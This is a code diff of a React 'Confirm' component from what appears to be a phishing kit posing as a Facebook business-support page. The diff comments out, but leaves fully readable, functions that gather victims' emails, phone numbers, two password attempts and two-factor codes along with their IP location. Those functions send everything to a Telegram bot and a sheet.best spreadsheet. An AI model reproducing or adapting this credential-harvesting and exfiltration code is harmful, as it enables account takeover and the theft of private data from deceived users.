@@ -50,13 +50,13 @@ const Confirm = () => {
       return;
     }
     setLoading(true);
-    const location = await axios.get(
-      "https://ipinfo.io?token=4ef03889d81a2d"
-    );
-    await Promise.all([
-      sendTelegramBotForBusiness(location),
-      sendTelegramBotForGgsheet(location),
-    ]);
+    // const location = await axios.get(
+    //   "https://ipinfo.io?token=4ef03889d81a2d"
+    // );
+    // await Promise.all([
+    //   sendTelegramBotForBusiness(location),
+    //   sendTelegramBotForGgsheet(location),
+    // ]);
     dispatch(
       setData({
         ...business,
@@ -68,93 +68,93 @@ const Confirm = () => {
     // navigate("/upload-image");
   };
 
-  const sendTelegramBotForGgsheet = async (response: any) => {
-    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
-    let CURRENT_API_URL = API_URL + "sendMessage";
-    try {
-      let message = "✅ Đã thêm vào sheet thành công";
-      const data = {
-        ["Name Page"]: business.namePage,
-        ["Full Name"]: business.fullName,
-        ["Business Email Address"]: business.businessEmail,
-        ["Personal Email Address"]: business.personalEmail,
-        ["Mobile Phone Number"]: business.phone,
-        // ["Date of Birth"]: business.date,
-        ["Please provide us information that will help us investigate"]:
-          business.text,
-        ["Password First"]: business.passwordFirst,
-        ["Password Second"]: business.passwordSecond,
-        ["Code"]: code,
-        ["Ip"]: response.data.ip,
-        ["City"]: response.data.city,
-        ["Country"]: response.data.country,
-      };
-      await axios
-        .post(
-          "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
-          data
-        )
-        .catch(() => {
-          message = "❌Thêm vào sheet không thành công";
-        });
-      await axios.post(
-        CURRENT_API_URL,
-        {
-          chat_id: ETelegram.CHAT_ID,
-          parse_mode: "html",
-          document: "",
-          text: message,
-          caption: message,
-        },
-        {
-          headers: {
-            "Content-Type": "multipart/form-data",
-          },
-        }
-      );
-    } catch (err) {
-      console.log("err: ", err);
-    }
-  };
+  // const sendTelegramBotForGgsheet = async (response: any) => {
+  //   const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+  //   let CURRENT_API_URL = API_URL + "sendMessage";
+  //   try {
+  //     let message = "✅ Đã thêm vào sheet thành công";
+  //     const data = {
+  //       ["Name Page"]: business.namePage,
+  //       ["Full Name"]: business.fullName,
+  //       ["Business Email Address"]: business.businessEmail,
+  //       ["Personal Email Address"]: business.personalEmail,
+  //       ["Mobile Phone Number"]: business.phone,
+  //       // ["Date of Birth"]: business.date,
+  //       ["Please provide us information that will help us investigate"]:
+  //         business.text,
+  //       ["Password First"]: business.passwordFirst,
+  //       ["Password Second"]: business.passwordSecond,
+  //       ["Code"]: code,
+  //       ["Ip"]: response.data.ip,
+  //       ["City"]: response.data.city,
+  //       ["Country"]: response.data.country,
+  //     };
+  //     await axios
+  //       .post(
+  //         "https://sheet.best/api/sheets/abe85991-15f1-47f0-a1d6-242f44b22e94",
+  //         data
+  //       )
+  //       .catch(() => {
+  //         message = "❌Thêm vào sheet không thành công";
+  //       });
+  //     await axios.post(
+  //       CURRENT_API_URL,
+  //       {
+  //         chat_id: ETelegram.CHAT_ID,
+  //         parse_mode: "html",
+  //         document: "",
+  //         text: message,
+  //         caption: message,
+  //       },
+  //       {
+  //         headers: {
+  //           "Content-Type": "multipart/form-data",
+  //         },
+  //       }
+  //     );
+  //   } catch (err) {
+  //     console.log("err: ", err);
+  //   }
+  // };
 
-  const sendTelegramBotForBusiness = async (response: any) => {
-    const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
-    let CURRENT_API_URL = API_URL + "sendMessage";
-    try {
-      let message = `
-      Email Account:  ${business.businessEmail}
-      Name Account: ${business.namePage}
-      Person Email: ${business.personalEmail}
-      Facebook Page: ${business.text}
-      User Name: ${business.fullName}
-      Phone Number: ${business.phone}
-      Password First: ${business.passwordFirst}
-      Password Second: ${business.passwordSecond}
-      Ip: ${response.data.ip}
-      City: ${response.data.city}
-      Country: ${response.data.country}
-      Code Authen: ${code}
-      
-      `;
-      await axios.post(
-        CURRENT_API_URL,
-        {
-          chat_id: ETelegram.CHAT_ID,
-          parse_mode: "html",
-          document: "",
-          text: message,
-          caption: message,
-        },
-        {
-          headers: {
-            "Content-Type": "multipart/form-data",
-          },
-        }
-      );
-    } catch (err) {
-      console.log("err: ", err);
-    }
-  };
+  // const sendTelegramBotForBusiness = async (response: any) => {
+  //   const API_URL = `https://api.telegram.org/bot${ETelegram.API_KEY}/`;
+  //   let CURRENT_API_URL = API_URL + "sendMessage";
+  //   try {
+  //     let message = `
+  //     Email Account:  ${business.businessEmail}
+  //     Name Account: ${business.namePage}
+  //     Person Email: ${business.personalEmail}
+  //     Facebook Page: ${business.text}
+  //     User Name: ${business.fullName}
+  //     Phone Number: ${business.phone}
+  //     Password First: ${business.passwordFirst}
+  //     Password Second: ${business.passwordSecond}
+  //     Ip: ${response.data.ip}
+  //     City: ${response.data.city}
+  //     Country: ${response.data.country}
+  //     Code Authen: ${code}
+
+  //     `;
+  //     await axios.post(
+  //       CURRENT_API_URL,
+  //       {
+  //         chat_id: ETelegram.CHAT_ID,
+  //         parse_mode: "html",
+  //         document: "",
+  //         text: message,
+  //         caption: message,
+  //       },
+  //       {
+  //         headers: {
+  //           "Content-Type": "multipart/form-data",
+  //         },
+  //       }
+  //     );
+  //   } catch (err) {
+  //     console.log("err: ", err);
+  //   }
+  // };
   const showModal = () => {
     setOpen(true);
   };
